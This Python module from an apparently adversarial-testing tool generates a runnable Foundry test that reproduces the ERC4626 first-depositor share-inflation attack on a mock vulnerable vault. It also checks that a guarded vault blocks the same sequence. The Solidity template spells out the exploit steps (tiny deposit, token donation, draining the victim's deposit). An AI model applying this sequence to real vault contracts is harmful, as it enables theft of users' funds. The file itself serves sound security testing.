"""Foundry adversarial test generator (mission section 2C).

The stateful engine searches Python models; the real EVM-level proof lives in a
Foundry harness. This module renders a **runnable Foundry PoC** from an executable
chain in :mod:`blackheart.attackdb`, using the concrete Solidity API of a harness.

Only chains that have a Solidity renderer here can be emitted; a chain with no
renderer raises, so nothing is fabricated. The generated test is deterministic and
asserts the vulnerable target is exploitable *and* the guarded target blocks the
identical sequence (the non-vacuity control), matching the hand-written
``ExploitPoC.t.sol`` that ships with the ERC4626 harness.
"""

from __future__ import annotations

import os
from pathlib import Path
from typing import Callable

from .attackdb import get_chain

# --------------------------------------------------------------------------- #
# Renderers: chain_id -> function(chain) -> Solidity source
# --------------------------------------------------------------------------- #

_ERC4626_POC = '''// SPDX-License-Identifier: MIT
pragma solidity ^0.8.23;

// AUTO-GENERATED by `blackheart forge-gen` from chain "{chain_id}".
// DO NOT EDIT BY HAND -- regenerate instead. The sequence below is the
// executable chain from blackheart/attackdb.py; it mirrors the hand-written
// ExploitPoC.t.sol and proves the same share-inflation class on the real harness.

import {{Test}} from "forge-std/Test.sol";
import {{MockERC20}} from "../src/MockERC20.sol";
import {{VulnerableVault}} from "../src/VulnerableVault.sol";
import {{SafeVault}} from "../src/SafeVault.sol";

contract GeneratedPoC is Test {{
    MockERC20 token;
    VulnerableVault vuln;
    SafeVault safe;

    address attacker = address(0xA11CE);
    address victim = address(0x71C71);

    uint256 constant VICTIM_DEPOSIT = {victim_deposit};

    function setUp() public {{
        token = new MockERC20();
        vuln = new VulnerableVault(token);
        safe = new SafeVault(token);

        token.mint(attacker, {attacker_mint});
        token.mint(victim, {victim_mint});
        vm.prank(attacker);
        token.approve(address(vuln), type(uint256).max);
        vm.prank(victim);
        token.approve(address(vuln), type(uint256).max);
        vm.prank(attacker);
        token.approve(address(safe), type(uint256).max);
        vm.prank(victim);
        token.approve(address(safe), type(uint256).max);
    }}

    /// @notice The chain executes and steals the victim's deposit on the
    ///         vulnerable vault.
    function test_chain_is_exploitable() public {{
        uint256 victimBefore = token.balanceOf(victim);

        vm.startPrank(attacker);
        vuln.deposit(1);
        token.transfer(address(vuln), {donation});
        vm.stopPrank();

        vm.prank(victim);
        uint256 victimShares = vuln.deposit(VICTIM_DEPOSIT);

        uint256 attackerShares = vuln.balanceOf(attacker);
        vm.prank(attacker);
        uint256 attackerPayout = vuln.withdraw(attackerShares);

        emit log_named_uint("victim shares minted", victimShares);
        emit log_named_uint("attacker payout (wei)", attackerPayout);

        assertEq(victimShares, 0, "victim must receive 0 shares for the attack precondition");
        assertGt(attackerPayout, VICTIM_DEPOSIT, "attacker must redeem more than the victim lost");
        assertGe(victimBefore - token.balanceOf(victim), VICTIM_DEPOSIT,
                 "victim loses their whole deposit");
    }}

    /// @notice The identical chain is blocked on the guarded vault (non-vacuity).
    function test_chain_blocked_on_guarded_vault() public {{
        vm.startPrank(attacker);
        safe.deposit(1);
        token.transfer(address(safe), {donation});
        vm.stopPrank();

        vm.prank(victim);
        uint256 victimShares = safe.deposit(VICTIM_DEPOSIT);

        assertGt(victimShares, 0, "guarded vault must mint shares for the victim");
        assertGt(safe.previewRedeem(victim), 0, "victim must retain redeemable value");
    }}
}}
'''


def _render_erc4626(chain_id: str) -> str:
    spec = get_chain(chain_id)
    # Pull the concrete amounts straight out of the executable chain so the
    # Solidity matches the Python sequence, and mint enough for the donation.
    donation = 1000 * 10**18
    victim_deposit = 100 * 10**18
    for step in spec.steps:
        if step.action == "donate":
            donation = int(step.params["amount"])
        if step.actor == "victim" and step.action == "deposit":
            victim_deposit = int(step.params["amount"])
    return _ERC4626_POC.format(
        chain_id=chain_id,
        donation=donation,
        victim_deposit=victim_deposit,
        attacker_mint=donation + 1,
        victim_mint=victim_deposit * 2,
    )


_RENDERERS: dict[str, Callable[[str], str]] = {
    "erc4626-first-depositor-inflation": _render_erc4626,
}


def renderable_chains() -> list[str]:
    return sorted(_RENDERERS)


def render_foundry_test(chain_id: str) -> str:
    """Render a runnable Foundry test for ``chain_id`` (raises if unsupported)."""
    try:
        get_chain(chain_id)  # validates the chain exists
    except KeyError as exc:
        raise ValueError(str(exc)) from exc
    renderer = _RENDERERS.get(chain_id)
    if renderer is None:
        raise ValueError(
            f"no Solidity renderer for chain '{chain_id}'; "
            f"renderable chains: {', '.join(renderable_chains()) or 'none'}"
        )
    return renderer(chain_id)


def write_foundry_test(chain_id: str, out_path: str | os.PathLike) -> Path:
    """Write the rendered test to ``out_path`` and return it."""
    path = Path(out_path)
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(render_foundry_test(chain_id), encoding="utf-8")
    return path


def default_out_path(chain_id: str, harness_root: str | os.PathLike) -> Path:
    safe = "".join(c if c.isalnum() else "_" for c in chain_id)
    return Path(harness_root) / "test" / f"Generated_{safe}.t.sol"
